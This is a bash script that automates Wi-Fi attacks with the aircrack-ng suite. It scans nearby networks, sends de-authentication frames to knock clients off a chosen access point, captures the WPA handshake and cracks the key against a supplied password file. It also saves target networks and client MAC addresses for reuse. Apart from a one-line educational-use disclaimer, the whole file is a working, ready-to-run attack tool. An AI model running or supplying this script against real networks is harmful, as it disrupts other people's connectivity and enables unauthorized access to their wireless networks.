#!/bin/bash

# interfaces
interface=wlp8s0
filePath=
# color
green=`tput setaf 2`
red=`tput setaf 1`
reset=`tput sgr0`

# check root permissions
if [ "$EUID" -ne 0 ]
 	then echo "${red}ERROR: Run this script as root!"
 	exit
fi

# help
showHelp() {
	echo ""
	echo "Usage: ./aircrack.sh <options>"
	echo ""
	echo "Options:"
	echo " -i <interface>: Wireless network interface to use. Default is wlp8s0."
	echo " -f <password file>: Path to password file for cracking network key."
	echo " -h: show help"
	echo ""
	exit
}

while getopts 'hf:i:' flag; do
  case "${flag}" in
  	h) showHelp ;;
    i) interface="${OPTARG}" ;;
	  f) filePath="${OPTARG}" ;;
    *) interface=wlp8s0
  esac
done

checkInterface=$(sudo airmon-ng | grep $interface | wc -l)

if [ "$checkInterface" == "0" ]
	then
		echo "${red}ERROR: $interface is not a valid network interface!${reset}"
		showHelp
	exit	
fi	

# 1 = monitor mode is enabled
interfaceMon=$interface"mon"
mangedMode=$(sudo airmon-ng | grep $interfaceMon | wc -l)

# Welcome text
figlet "Aircrack"
echo "DISCLAIMER: For educational use only. Do NOT use on networks you don't own or have permissions to test!"
echo ""

# Check if Wi-Fi card is in monitor mode
if [ "$mangedMode" == "0" ]
	then
	echo ""
	echo "WARNING: Montior mode is not enabled for $interface"
	read -p 'Enable monitor mode (y/n)? ' option1

	if [ "$option1" == "y" ] || [ "$option1" == "Y" ]
	then
		echo ""
		sudo airmon-ng start $interface
		#interfaceMon=$interface+="mon"
	fi
else
	echo "${green}MONITOR MODE ENABLED: $interfaceMon${reset}"
fi

# Choose operation
start () {
	echo ""
	echo "-- SELECT AN OPERATION --"
	echo "[1] De-auth attack (automatic)"
	echo "[2] De-auth attack (manual)"
	echo "[3] Show clients connected to network"
	echo "[4] Disable monitor mode for $interfaceMon"
	echo ""
	read -p 'Select operation: ' option2

	if [ "$option2" == "1" ] # auto attack
		then
		sudo rm scan-01.* --force > /dev/null
		echo "Scanning networks for 10 seconds..."
		screen -d -m sudo airodump-ng -w scan --output-format csv $interfaceMon
		sleep 10s
		sudo killall screen
		sed -i '1d' scan-01.csv
		sed -i '1d' scan-01.csv
		echo ""
		echo "-- Choose network --"
		i=1
		filename=scan-01.csv
		while read line; do
			stop=$(echo $line | grep "Station MAC" | wc -l)
			if [ "$stop" == "1" ]; then
				break
			fi
			mac=${line:0:17}
			channel=${line:61:2}
			name=${line: -19}
			echo "[$i] $mac -> $name"
			i=$((i+1))
		done < $filename

		read -p 'Choose network: ' network
		res=$(sed -n $((network))p scan-01.csv)
		ap=${res:0:17}
		channel=${res:61:2}
		name=${res: -20}
		echo "Name: $name"
		echo "Mac: $ap"
		echo "Channel: $channel"
		echo ""
		read -p "De-auth requests (default is 1): " number
		echo ""
		read -p "Try to crack WiFi password (y/n)? " capture
		echo ""
		deAuth
	elif [ "$option2" == "2" ] # manual attack
		then
		echo ""
		if [ -f "file" ]
			then
			read -p "Load saved targets (y/n)? " load
			echo ""
		fi

	if [ "$load" == "y" ] || [ "$load" == "Y" ]
		then
		currentLine=1
		lines=$(wc -l < file)

		targets=$((lines / 4))

		echo "$targets saved targets"

		for i in $(eval echo "{1..$targets}"); do
			echo ""
			echo "[Target $i]"
			echo "Name: $(sed -n $((currentLine))p file)"
			echo "AP MAC: $(sed -n $((currentLine+1))p file)"
			echo "Client MAC: $(sed -n $((currentLine+2))p file)"
		  echo "Channel: $(sed -n $((currentLine+3))p file)"
		  currentLine=$((currentLine+4))
		done

		echo ""
		read -p "Enter target [1-$targets]: " targ
		targ=$((targ-1))
		currentLine=$((1+($targ*4)))
		name=$(sed -n $((currentLine))p file)
		ap=$(sed -n $((currentLine+1))p file)
		client=$(sed -n $((currentLine+2))p file)
		channel=$(sed -n $((currentLine+3))p file)

		echo ""
		echo "${green}$name ($client) is selected! ${reset}"
	  echo ""
		read -p "De-auth requests (default is 1): " number
		echo ""
		read -p "Try to crack WiFi password (y/n)? " capture
		echo ""
		deAuth
	else
		echo "-- New target --"
		read -p "Access point MAC address: " ap
		read -p "Client MAC address (leave empty for every device): " client
		read -p "Channel: " channel
		read -p "De-auth requests (default is 1): " number
		read -p "Try to crack WiFi password (y/n)? " capture
		read -p "Save target for later (y/n)? " save

		if [ "$save" == "y" ] || [ "$save" == "Y" ]
			then
			read -p "Name: " name
			printf "$name\n$ap\n$client\n$channel\n" >> file # save to file
		fi

		deAuth
	fi
	elif [ "$option2" == "3" ] # show clients
		then
		read -p 'Enter network name (SSID): ' name
		sudo airodump-ng $interfaceMon --essid $name -a 		
	elif [ "$option2" == "4" ]
		then
		echo "Stoppping interface..."
		sudo airmon-ng stop $interfaceMon > /dev/null
		echo "Done."
	fi
}

deAuth () {
  sudo airmon-ng start $interfaceMon $channel > /dev/null

  if [ "$number" == "" ] # default de-auth requests is 1
  	then
  		number=1
  fi

  if [ "$capture" == "y" ] || [ "$capture" == "Y" ]
  then
  	echo "-- Starting handshake capture --"
  	echo ""
  	sudo rm capture-* --force
  	screen -d -m sudo airodump-ng -d $ap -c $channel -w capture $interfaceMon > /dev/null
  fi

  echo "-- Starting de-auth attack ($number requests) --"
	echo ""

	if [ -z "$client" ]
	then
		sudo aireplay-ng -0 $number -a $ap $interfaceMon
	else
		sudo aireplay-ng -0 $number -a $ap -c $client $interfaceMon
	fi

	if [ "$capture" == "y" ] || [ "$capture" == "Y" ]
  then
  	echo ""
  	echo "-- Stopping handshake capture (10s) ---"
  	sleep 10s
		sudo killall screen
		echo ""
		echo "-- Cracking Wi-Fi key --"
		if [ "$filePath" = "" ]
			then
				echo "${red}ERROR: No password file specified."
				showHelp
				exit
			fi
  	sudo aircrack-ng capture-01.cap -w $filePath
  fi

	echo ""
	read -p "${green}Attack completed. Press any key to continue...${reset}" blah

	start
}

start
